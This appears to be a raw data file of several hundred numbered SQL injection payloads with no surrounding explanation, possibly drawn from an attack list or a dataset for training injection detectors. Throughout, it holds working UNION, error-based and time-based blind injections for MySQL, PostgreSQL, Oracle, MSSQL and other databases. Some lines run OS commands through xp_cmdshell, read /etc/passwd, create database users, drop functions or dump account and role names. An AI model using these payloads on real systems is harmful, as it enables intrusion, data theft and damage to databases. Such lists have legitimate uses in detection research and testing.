1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
2 -8203"  )   union all select 6394,6394,6394,6394,6394-- 
6 -7142'   )    )    union all select 5083,5083,5083,5083# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
16 -9031%"  )   order by 1-- 
17 -2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646-- 
19 1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +' 
22 select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg 
24 -2378" where 2686  =  2686 or 6872  =  6872-- 
25 -4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059-- 
26 -8448%" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and "%"  =  " 
27 iif  (  1878  =  2513,1,1/0  )   
29 end and    (    (   2160  =  2160 
30 -6220' union all select 1462,1462# 
34 -4543"  )   or 3038  =  3038 
35 -9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665-- 
37 -9014%'  )   union all select 4211,4211,4211,4211,4211,4211# 
40 -7202%"   )    )    union all select 2901# 
41  select * from users where id  =  1 or ".  )  " or 1  =  1 -- 1 
48 select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
49 select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  # 
50 -9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa 
53 -9653'  )   where 2705  =  2705 or 9323  =  9323# 
55 -9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934# 
56 call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  "qwdi"  =  "qwdi 
61  or 'something'   =   'some'+'thing' 
65 -8397'   )    )     )   or 2171  =  4788 
66 -9737"   )    )     )   order by 1-- 
67 -1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889-- 
71  select * from users where id  =  1 or 1#"? union select null,version  (    )   -- 1 
72 select 
74 -9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719-- 
82 1'+  (  select iutk where 6158  =  6158 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
85  select * from users where id  =  1 or 1#"1 union select 'a',version  (    )   -- 1 
86 -9891" union all select 7489# 
90 -3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap 
91 if  (  3593  =  3779  )   select 3593 else drop function qtqy-- 
95 -4699  )   as mymz where 3405  =  3405 or elt  (  1032  =  1032,3623  )  -- 
96  select * from users where id  =  1 or 1#"{ union select null,version  (    )   -- 1 
97 -9356 or elt  (  1032  =  1032,3623  )  -- izgi 
104 -7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff 
106 -1447" union all select 3013,3013,3013,3013,3013,3013,3013-- 
107 -2226%"   )    )    union all select 1018,1018,1018,1018-- 
108 -4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488-- 
109 -6381%"   )    )     )   union all select 1503,1503,1503,1503# 
113 -2071 union all select 4753,4753-- 
118 select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc 
119 -5560"   )    )    or 7292  =  6184# 
126 -2168"   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935-- 
131 select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   "nxvp"  =  "nxvp 
133  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i 
135 select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm 
136 -7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891# 
137  having 1  =  1-- 
143 -5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# 
145 select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240 
148 select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1-- 
149 1'+  (  select mkbv where 1648  =  1648 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- 
150 select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu 
159 -2028'   )    )     )   union all select 8698,8698,8698,8698# 
162 or 1  =  1/* 
163 -9370'  )   where 7070  =  7070 or make_set  (  9354  =  9354,7185  )  -- 
171  or userid like '% 
173 select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  "%"  =  " 
174  )   or   (  'x'  =  'x 
178 -3867%'  )   or 3084  =  5633 and   (  '%'  =  ' 
180 -1375'   )    )     )   or   (  1226  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy 
182 -- &password  =  
183 select case when 5559  =  3483 then 1 else null end-- 
184 -4152"  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781-- 
185 1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +' 
186 select sleep  (  5  )   and    (    (     (  "lczw"  =  "lczw 
187 call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt 
189 -9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299 
192 -4955%' union all select 5928,5928-- 
194  select * from users where id  =  1 <@. union select 1,version  (    )   -- 1 
195 1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +' 
199 select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1 
201 -7624'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'iwab'  =  'iwab 
202 -5591%"   )    )    order by 1-- 
203  (  8266  =  8266  )  *9900 
204 -8410'   )    )     )   or 8571  =  8571-- 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
211  end and "%"  =  " 
212 1'+  (  select yjyp where 9696  =  9696 
214 -1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh 
217 select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa 
220 *| 
223 -4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285# 
224 call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb 
227 select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1 
230  (  select   (  case when   (  1570  =  6977  )   then 1 else 1570*  (  select 1570 from mysql.db  )   end   )    )  
235 -5327'   )    )     )   or 1606  =  6099 
238 1'+  (  select 'tjvt' where 2463  =  2463 
240 -1050"   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   "orfo" like "orfo 
242 select pg_sleep  (  5  )   and "%"  =  " 
244 1'+  (  select xlvq where 7470  =  7470 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +' 
246 select sleep  (  5  )   and    (    (   8679  =  8679 
247 1'+  (  select 'ixvd' where 4772  =  4772 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +' 
248 -2276"   )    )    as qwow where 2321  =  2321 or 3534  =  2971-- 
255  select * from users where id  =  '1' union select $["],@@VERSION -- 1' 
256 select * from information_schema.tables-- 
257 -6928"   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   "mxhr" like "mxhr 
259 select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
262 -5356'  )   or 9323  =  9323# 
265 1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +' 
269  select * from users where id  =  1 or "1{" or 1  =  1 -- 1 
271 1'+  (  select zbyt where 4575  =  4575 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +' 
275 declare @s varchar  (  22  )   select @s   =  
280 1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +' 
281 as 
284 -1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  -- 
286 1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +' 
289 1'+  (  select dyfw where 7743  =  7743 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +' 
291 -4205'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   
293 1'+  (  select 'kicv' where 1976  =  1976 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +' 
294 -2806'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'rxzr'  =  'rxzr 
297 -2453"  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520-- 
298 -4256'  )   where 9545  =  9545 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- 
303  select * from users where id  =  1 or 1#"$ union select 'a',version  (    )   -- 1 
305 select * from users where id  =  '1' or $<\ or 1  =  1 -- 1' 
310  end and    (    (     (  "memh" like "memh 
311  select * from users where id  =  1 or ";#" or 1  =  1 -- 1 
313 1'+  (  select taga where 8036  =  8036 
314 -8639  )   or 8138  =  6252 
316  (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    )  
318 1'+  (  select gqez where 3704  =  3704 
319 -7416" where 7656  =  7656 order by 1-- 
322 if  (  3392  =  4422  )   select 3392 else drop function xsqq-- 
324 -5520%" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- 
328 -3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741# 
332 -9393' where 3119  =  3119 or 8571  =  8571-- 
334 -3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  -- 
335  union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1; 
337 -2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495-- 
338 -8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049# 
343 -5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ' 
345 call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa 
348 call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  ' 
352 %27 or 1  =  1 
356 -9509'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz 
357 -4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup 
359 1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   # 
361 iif  (  3760  =  4785,1,1/0  )   
362 -1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj 
365 -5386'  )   union all select 8026,8026,8026,8026,8026,8026# 
366 -4165" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772-- 
367  (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    )  
370 1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  # 
374 -6599%"   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   "%"  =  " 
378 select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  # 
379 select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1' 
382  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i 
385 -6662"   )    )    union all select 6755-- 
388 -4494 or 5291  =  4452 
389 waitfor delay '0:0:5' and   (  "dmcu"  =  "dmcu 
394 1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null# 
395 -1638' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'xkne'  =  'xkne 
396 -9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900# 
398 -9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743-- 
399 select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq 
401 select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847 
406 1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  -- 
409 iif  (  1157  =  4542,1,1/0  )   
410 select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx 
412 select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy 
415 select   (  case when   (  4061  =  1396  )   then 4061 else 1/  (  select 0  )   end  )  -- 
416 -9509'  )   where 9303  =  9303 order by 1# 
423 iif  (  8354  =  3515,1,1/0  )   
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
429   (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  "avyw"  =  "avyw 
432 %2A%28%7C%28objectclass%3D%2A%29%29 
433 -2448%"  )   or 3038  =  3038 
434 select case when 9390  =  5752 then 1 else null end-- 
437 call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj 
440 select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   "vqpx" like "vqpx 
441 -6254%'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
442 select   (  case when   (  9986  =  8342  )   then 9986 else 9986*  (  select 9986 from information_schema.character_sets  )   end  )  # 
446 -1621' in boolean mode  )   order by 1-- 
449 -8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap 
450 select sleep  (  5  )   and    (    (     (  "%"  =  " 
451 -7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117# 
452  select sleep  (  5  )   and "%"  =  " 
453 -4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# 
455 select   (  case when   (  7254  =  5901  )   then 1 else 7254*  (  select 7254 from master..sysdatabases  )   end  )  -- 
459 -9871"  )   union all select 9082# 
460 -6368' union all select 6529,6529,6529-- 
465 1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +' 
466 -2569' union all select 4484-- 
470 select case when 7951  =  1147 then 1 else null end-- 
473 -8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132-- 
475 -1550%"   )    )     )   order by 1-- 
477 -7371'  )   union all select 4531,4531,4531# 
478 -4191  )   order by 1# 
481  select * from users where id  =  1 or ".]" or 1  =  1 -- 1 
482 select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  "%"  =  " 
484 -9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  -- 
485 -6546"  )   order by 1# 
486 -4480'  )   where 4661  =  4661 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
490  select * from users where id  =  1 or "{." or 1  =  1 -- 1 
495 -3088' or 6872  =  6872 and 'miwk'  =  'miwk 
496 -1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291# 
498 select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1 
499 or 'something'   =   'some'+'thing' 
502 -7111%" union all select 6083,6083,6083,6083,6083,6083-- 
503 -8633" or 5099  =  5974 
504 -5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
505 -8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492# 
506 select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1-- 
507 select   (  case when   (  4043  =  5276  )   then 4043 else 4043*  (  select 4043 from information_schema.character_sets  )   end  )  # 
508  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i 
513 -2211" or 2113  =  8885# 
514 1'+  (  select hett where 7228  =  7228 
516 waitfor delay '0:0:5' and '%'  =  ' 
517 -5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- 
518 select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  -- 
520 -9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202-- 
521 call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  -- 
524 -8245"   )    )    or 3038  =  3038 
526 -6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675-- 
527  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj 
532 select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
533 1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null-- 
534 -6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839-- 
536 " " 
537 select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  # 
540 1 uni/**/on select all from where 
542 1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +' 
543 -1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415# 
544 1'+  (  select 'opqr' where 2442  =  2442 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- 
547  select * from users where id  =  1 union select @ 1a,version  (    )   -- 1 
554 select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq 
555 create user name identified by 'pass123' 
561  select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1 
562 -5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466 
563 -2820'   )    )    or 6679  =  8848-- 
565 -2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk 
568 -6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271# 
569  select * from users where id  =  1 or @#"  (    =  1 or 1  =  1 -- 1 
570 select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual-- 
571 -3666"   )    )     )   union all select 4136,4136,4136-- 
573 -9496   )    )     )   or elt  (  7511  =  3951,3951  )   and    (    (     (  3514  =  3514 
574 -4775'  )   or 3038  =  3038 
575 if  (  4735  =  8907  )   select 4735 else drop function qigo-- 
578 -4015" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # 
579 1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595# 
583 -9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950-- 
586 -5425 where 5933  =  5933 union all select 5933,5933,5933-- 
589 -3250%" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162-- 
590 1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277-- 
591 -8777"  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  -- 
592 -4406%' union all select 9599,9599,9599,9599# 
594 -6567'   )    )    union all select 3217# 
599 -6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388# 
600 select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
605  (  7098  =  7098 and sleep  (  5   )    )  
608 -7006' where 6966  =  6966 union all select 6966,6966,6966,6966# 
611 -1459'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'eiet' like 'eiet 
612 select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  "layz"  =  "layz 
613 -6184"   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   "rovr"  =  "rovr 
617 -3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420# 
618 -4055'   )    )    as yoez where 3816  =  3816 or   (  8459  =  8459  )  *4906-- 
620  select * from users where id  =  '1' union select +\.,@@VERSION -- 1' 
621 -4045 union all select 6857,6857,6857,6857,6857,6857,6857-- 
629 select   (  case when   (  4297  =  9086  )   then 4297 else 1/  (  select 0  )   end  )  -- 
635 -8881%' union all select 8420,8420,8420,8420,8420,8420,8420# 
638 -2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746# 
639 1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   -- 
641 -5520"   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- 
642 1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +' 
643 -9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  ' 
645  select * from users where id  =  1 or ".@" or 1  =  1 -- 1 
646 if  (  8284  =  6171  )   select 8284 else drop function mbih-- 
649 -7901  )   order by 1-- 
